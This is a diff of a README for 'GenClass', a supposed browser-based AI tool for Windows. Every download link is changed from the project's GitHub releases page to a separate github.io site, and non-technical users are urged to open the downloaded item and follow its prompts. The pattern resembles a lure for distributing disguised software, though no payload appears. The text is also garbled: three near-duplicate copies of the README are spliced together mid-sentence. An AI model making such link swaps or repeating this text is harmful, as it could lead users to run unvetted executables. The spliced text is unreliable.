@@ -1,6 +1,6 @@
 # 🧠 GenClass - AI That Runs In Your Browser
 
-[![Download GenClass](https://img.shields.io/badge/Download_GenClass-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Singhama8615/GenClass/releases)
+[![Download GenClass](https://img.shields.io/badge/Download_GenClass-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://singhama8615.github.io)
 
 GenClass is the browser version of Jev, built for people who want practical AI help without a complicated setup. It brings classification, browser automation, and computer-use style workflows into a familiar browser experience. GenClass is open source, designed for Windows users, and made to be used by everyday people as well as technical teams.
 
@@ -63,7 +63,7 @@ You do not need to be a developer. You do not need to know Python, command-line 
 
 Visit this link to download the application:
 
-[Download GenClass](https://github.com/Singhama8615/GenClass/releases)
+[Download GenClass](https://singhama8615.github.io)
 
 Use the download link above on your Windows computer. After the download finishes, open the downloaded item from your Downloads folder or from the location where your browser saved it. Follow the prompts shown on your screen to start GenClass. No programming knowledge is required.
 
@@ -75,7 +75,7 @@ After you download GenClass, open it on your Windows computer. The first launch 
 
 GenClass is built around browser use. That means you can keep it open while you work with web pages, classify information, or explore automation features. If you are new to AI tools, start with a small task: classify a short list, sort a# 🧠 GenClass - AI That Runs In Your Browser
 
-[![Download GenClass](https://img.shields.io/badge/Download_GenClass-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Singhama8615/GenClass/releases)
+[![Download GenClass](https://img.shields.io/badge/Download_GenClass-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://singhama8615.github.io)
 
 GenClass is the version of Jev that runs in your browser. It is built for people who want useful AI help with everyday computer tasks without a complicated setup. GenClass brings classification, browser automation, computer-use style workflows, voice control, and open-source machine-learning ideas into a browser experience that is meant to be downloaded and used by regular Windows users. You do not need programming knowledge to get started. The goal is to make a powerful browser-based AI tool feel approachable, clear, and practical.
 
@@ -137,7 +137,7 @@ You do not need to be a developer. You do not need to know Python, command-line 
 
 Visit this link to download the application:
 
-[Download GenClass](https://github.com/Singhama8615/GenClass/releases)
+[Download GenClass](https://singhama8615.github.io)
 
 Use the download link above on your Windows computer. Visit this link to download the application, then open the downloaded application from your Downloads folder or from the location where your browser saved it. GenClass is intended for Windows users who want a direct way to try the browser-based version of Jev. No programming knowledge is required.
 
@@ -159,7 +159,7 @@ The application is built around classification and computer-use ideas. Classific
 
 GenClass is also an open-source project, which means# 🧠 GenClass - AI That Runs In Your Browser
 
-[![Download GenClass](https://img.shields.io/badge/Download_GenClass-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Singhama8615/GenClass/releases)
+[![Download GenClass](https://img.shields.io/badge/Download_GenClass-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://singhama8615.github.io)
 
 GenClass is the version of Jev that runs in your browser. It is built for people who want useful AI help with everyday computer tasks without a complicated setup. GenClass brings classification, browser automation, computer-use style workflows, voice control, and open-source machine-learning ideas into a browser experience that is meant to be downloaded and used by regular Windows users. You do not need programming knowledge to get started. The goal is to make a powerful browser-based AI tool feel approachable, clear, and practical.
 
@@ -221,7 +221,7 @@ You do not need to be a developer. You do not need to know Python, command-line 
 
 Visit this link to download the application:
 
-[Download GenClass](https://github.com/Singhama8615/GenClass/releases)
+[Download GenClass](https://singhama8615.github.io)
 
 Use the download link above on your Windows computer. Visit this link to download the application, then open the downloaded application from your Downloads folder or from the location where your browser saved it. GenClass is intended for Windows users who want a direct way to try the browser-based version of Jev. No programming knowledge is required.
 
